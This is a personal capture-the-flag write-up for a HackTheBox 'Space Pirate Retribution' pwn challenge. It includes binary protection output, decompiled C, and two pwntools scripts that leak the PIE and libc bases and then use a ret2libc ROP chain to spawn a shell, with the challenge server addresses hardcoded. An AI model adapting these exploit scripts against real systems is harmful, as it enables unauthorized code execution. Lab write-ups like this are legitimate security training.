---
Category:
  - Pwn
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [leaking-stack, ret2libc]
---
>[!quote]
>*We got access to the Admin Panel! The last part of the mission is to change the target location of the missiles. We can probably target Draeger's HQ or some other Golden Fang's spaceships. Draeger's HQ might be out of the scope for now, but we can certainly cause significant damage to his army.* 

# Set up

Download the binary or spawn the docker instance

# Information Gathering

Binary information and protections:

```bash
┌──(kali㉿kali)-[~/…/HTB_CA2022/Pwn/Space_Pirate_Retribution/challenge]
└─$ checksec --file=sp_retribution
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified     Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   RW-RUNPATH   77) Symbols       No    0    2sp_retribution

┌──(kali㉿kali)-[~/…/HTB_CA2022/Pwn/Space_Pirate_Retribution/challenge]
└─$ file sp_retribution
sp_retribution: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=418b5fa1bd52c216b4bdbebb95c60340e9f632d4, not stripped
```

The binary is PIE we need to leak its base, it also has full RELRO so overwriting a GOT entry is not an option.

## Decompiled code

- **main.c**
    
    ```c
    void main(void)
    
    {
      char menu [3];
      
      setup();
      banner();
      while( true ) {
        while( true ) {
          printf(&DAT_00101f68,&DAT_00100d78);
          read(0,menu,2);
          if (menu[0] != '1') break;
          show_missiles();
        }
        if (menu[0] != '2') break;
        missile_launcher();
      }
      printf("\n%s[-] Invalid option! Exiting..\n\n","\x1b[1;31m");
                        /* WARNING: Subroutine does not return */
      exit(0x520);
    }
    ```
    
- **show_missiles.c**
    
    ```c
    void show_missiles(void)
    
    {
      printf("%s\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n","\x1b[1;36m");
      puts(&DAT_00101dc3);
      printf(&DAT_00101ddb,&DAT_00100d70,&DAT_00100d58,&DAT_00100d60);
      printf(&DAT_00101e00,&DAT_00100d70,&DAT_00100d58,&DAT_00100d60);
      printf(&DAT_00101e28,&DAT_00100d70,&DAT_00100d58,&DAT_00100d68,&DAT_00100d60);
      puts("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
      puts(&DAT_00101e90);
      printf(&DAT_00101eb0,&DAT_00100d70,&DAT_00100d58,&DAT_00100d68,&DAT_00100d60);
      printf(&DAT_00101ee0,&DAT_00100d70,&DAT_00100d58,&DAT_00100d68,&DAT_00100d60);
      printf(&DAT_00101f0c,&DAT_00100d70,&DAT_00100d60);
      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n%s","\x1b[1;34m");
      return;
    }
    ```
    
- **missile_launcher.c**
    
    ```c
    void missile_launcher(void)
    
    {
      undefined8 confirm;
      undefined8 local_50;
      undefined8 local_48;
      undefined8 local_40;
      char new_y [32];
      undefined8 local_18;
      undefined8 local_10;
      
      local_10 = 0x53e5854620fb399f;
      local_18 = 0x576b96b95df201f9;
      printf("\n[*] Current target\'s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinate s: x = [0x%lx], y = "
             ,0x53e5854620fb399f,0x576b96b95df201f9,0x53e5854620fb399f);
      confirm = 0;
      local_50 = 0;
      local_48 = 0;
      local_40 = 0;
      read(0,new_y,31);
      printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n) : "
             ,new_y);
      read(0,&confirm,132);
      printf("\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been re set!%s\n"
             ,"\x1b[1;31m","\x1b[1;34m");
      return;
    }
    ```
    

libc address:

```bash
┌──(kali㉿kali)-[~/…/HTB_CA2022/Pwn/Space_Pirate_Retribution/challenge]
└─$ ldd sp_retribution
        linux-vdso.so.1 (0x00007ffdf3673000)
        libc.so.6 => ./glibc/libc.so.6 (0x00007f007a4c1000)
        ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f007aa91000)
```

# The Bug

# Exploitation

```python
#!/usr/bin/env python3
#Get Pie leak from stack
#Get Libc leak from puts
#ret2libc

from pwn import *
exe = ELF('./sp_retribution_patched')
libc = ELF('./glibc/libc.so.6')

context.binary = exe
context.log_level='debug'

offset = 88
pop_rdi = 0x0000000000000d33 #: pop rdi; ret;

def conn():
    if args.REMOTE:
        io = remote('178.62.73.26', 30333)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)
    return io

io = conn()

#Get Pie leak from stack
io.sendlineafter(b'>> ', b'2')
io.send(b'A'*8)
io.recvuntil(b'A'*8)
leak = io.recvuntil(b'\n', drop=True)
exe.address = u64(leak.ljust(8, b'\x00')) - 0xd70
info("Pie base:%#x", exe.address)

#Get libc leak from got.puts
rop = ROP(exe)
rop.puts(exe.got.puts)
rop.missile_launcher()

io.sendlineafter(b': ', flat({offset: rop.chain()}))

io.recvuntil(b'34m\n')
leak = io.recvuntil(b'\n\n', drop=True)
libc.address = u64(leak.ljust(8, b'\x00')) - 0x6f6a0
info("Libc base:%#x", libc.address)

io.send(b'A')

#Ret2libc
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendlineafter(b': ', flat({offset: rop.chain()}))

io.interactive()
```

```python
from pwn import *
import re

local_path = "sp_retribution"

pty = process.PTY
elf = context.binary = ELF(local_path)

libc = ELF('glibc/libc-2.23.so')

def init(rem=False):
    if rem:
        io = remote("138.68.188.223", 30195)
    else:
        io = process(elf.path, stdin=pty, stdout=pty)
    return io

def find_rip_offset(io):
    io.clean()
    io.sendline(cyclic(0x1000))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    info("cyclic pattern = %s", pattern.decode())
    rip_offset = cyclic_find(pattern)
    info("rip offset is = %d", rip_offset)
    return rip_offset

#io = init()
#offset = find_rip_offset(io)
#io.close()
offset = 88

# leak
io = init(True)

io.recvuntil(b">> ")
io.sendline(b'2')
io.recvuntil(b'y = ')
io.sendline(b'')
data = io.recvuntil(b'(y/n): ')

# leak base elf addr
#base = u32(re.findall(b"y = \n\r(.*?)\n", data)[0]) << 16
base = data.split(b'\n')[-2]
base = u32(base[1:]) << 16

print("leaked base: %s"%hex(base))

pop_rdi_ret = 0x0000000000000d33

chain = b'A'*offset
chain += p64(base + pop_rdi_ret)                # load got.read into rdi
chain += p64(base + elf.got.read)
chain += p64(base + elf.plt.puts)               # leak it
chain += p64(base + elf.sym.missile_launcher)   # go back to vuln function

# send stage1
io.sendline(chain)
#context.log_level = 'debug'
# read leaked address
io.recvuntil(b"eset!\x1b[1;34m\n")

libc_read = u64(io.recv(6) + b'\x00\x00')
print("leaked read add: %s"%hex(libc_read))

# compute some offset, easy game we have a copy of the libc
system = libc_read - 0xb1fb0
bin_sh = libc_read + 0x95b07

# play again
io.recvuntil(b'y = ')
io.sendline(b'')
io.recvuntil(b'(y/n): ')

# system(/bin/sh)
chain = b'A'*offset
chain += p64(base + pop_rdi_ret)
chain += p64(bin_sh)
chain += p64(system)
print("shell...")
io.sendline(chain)
io.interactive()
```

# Flag

N/A